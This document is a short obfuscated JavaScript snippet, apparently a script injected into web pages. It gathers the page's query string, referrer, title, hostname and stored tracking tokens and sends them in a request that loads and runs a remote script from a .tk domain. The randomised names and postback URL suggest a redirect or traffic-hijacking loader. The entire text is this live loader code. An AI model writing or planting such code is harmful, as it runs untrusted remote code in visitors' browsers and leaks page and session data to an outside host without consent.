 (function() {
    var name = '_BvhF8kPZqZjwPCZ8';
    if (!window._BvhF8kPZqZjwPCZ8) {
        window._BvhF8kPZqZjwPCZ8 = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://whiranjafusboooo.tk/2T8gJK',
            P_PATH: 'https://whiranjafusboooo.tk/fec84ce/postback',
        };
    }
    const _6M4RRgK6mNGyYhx5 = localStorage.getItem('config');
    if (typeof _6M4RRgK6mNGyYhx5 !== 'undefined' && _6M4RRgK6mNGyYhx5 !== null) {
        var _8ybsJNb84KtJmGKB = JSON.parse(_6M4RRgK6mNGyYhx5);
        var _cc22y4cK4Qy5vxNf = Math.round(+new Date()/1000);
        if (_8ybsJNb84KtJmGKB.created_at + window._BvhF8kPZqZjwPCZ8.ttl < _cc22y4cK4Qy5vxNf) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _phWcSXN5pqmbpJV7 = localStorage.getItem('subId');
    var _sp5BPSWTYRhhLDR1 = localStorage.getItem('token');
    var _rrKcGcd56X3TbfZg = '?return=js.client';
        _rrKcGcd56X3TbfZg += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _rrKcGcd56X3TbfZg += '&se_referrer=' + encodeURIComponent(document.referrer);
        _rrKcGcd56X3TbfZg += '&default_keyword=' + encodeURIComponent(document.title);
        _rrKcGcd56X3TbfZg += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _rrKcGcd56X3TbfZg += '&name=' + encodeURIComponent(name);
        _rrKcGcd56X3TbfZg += '&host=' + encodeURIComponent(window._BvhF8kPZqZjwPCZ8.R_PATH);
    if (typeof _phWcSXN5pqmbpJV7 !== 'undefined' && _phWcSXN5pqmbpJV7 && window._BvhF8kPZqZjwPCZ8.unique) {
        _rrKcGcd56X3TbfZg += '&sub_id=' + encodeURIComponent(_phWcSXN5pqmbpJV7);
    }
    if (typeof _sp5BPSWTYRhhLDR1 !== 'undefined' && _sp5BPSWTYRhhLDR1 && window._BvhF8kPZqZjwPCZ8.unique) {
        _rrKcGcd56X3TbfZg += '&token=' + encodeURIComponent(_sp5BPSWTYRhhLDR1);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._BvhF8kPZqZjwPCZ8.R_PATH + _rrKcGcd56X3TbfZg;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
